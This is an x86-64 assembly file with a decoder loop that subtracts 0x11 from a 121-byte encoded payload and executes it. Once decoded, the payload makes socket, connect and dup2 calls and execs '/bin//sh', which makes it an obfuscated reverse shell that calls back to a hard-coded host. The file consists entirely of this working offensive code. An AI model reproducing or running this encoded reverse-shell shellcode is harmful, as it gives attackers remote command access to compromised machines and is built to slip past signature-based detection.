global _start

section .text

_start:
   jmp short exec_shellcode

start_decoding:
    pop rsi
    xor rcx, rcx

    xor_loop:    
        mov al, byte [rsi+rcx]
        sub al, 0x11
        mov byte [rsi+rcx], al
        inc rcx
        cmp rcx, 121
        jne xor_loop

    jmp rsi

exec_shellcode:
    call start_decoding
    shellcode: db 0x7b, 0x3a, 0x69, 0x7b, 0x13, 0x70, 0x7b, 0x12, 0x6f, 0xaa, 0x20, 0x16, 0x59, 0x9a, 0xd6, 0x59, 0xc9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x13, 0x61, 0x59, 0xc9, 0x14, 0x12, 0x30, 0x71, 0x8f, 0x12, 0x12, 0x14, 0x59, 0x42, 0x15, 0x35, 0x7b, 0x3b, 0x69, 0x59, 0x9a, 0x00, 0x7b, 0x21, 0x6b, 0x59, 0x9a, 0xf7, 0x20, 0x16, 0x7b, 0x14, 0x6f, 0x59, 0x10, 0xdf, 0x89, 0x1c, 0x67, 0x7b, 0x32, 0x69, 0x59, 0x9a, 0x00, 0x20, 0x16, 0xfc, 0x00, 0x7b, 0x79, 0x59, 0xc9, 0x40, 0x73, 0x7a, 0x7f, 0x40, 0x40, 0x40, 0x84, 0x61, 0x59, 0x9a, 0xf8, 0x79, 0x83, 0x7a, 0x12, 0x12, 0x92, 0x45, 0x35, 0x12, 0x12, 0x12, 0x12, 0x42, 0x07, 0x67, 0x7b, 0x19, 0x6f, 0x59, 0x12, 0xf7, 0x67, 0x59, 0x9a, 0xf7, 0x42, 0xe3, 0x7b, 0x4c, 0x69, 0x20, 0x16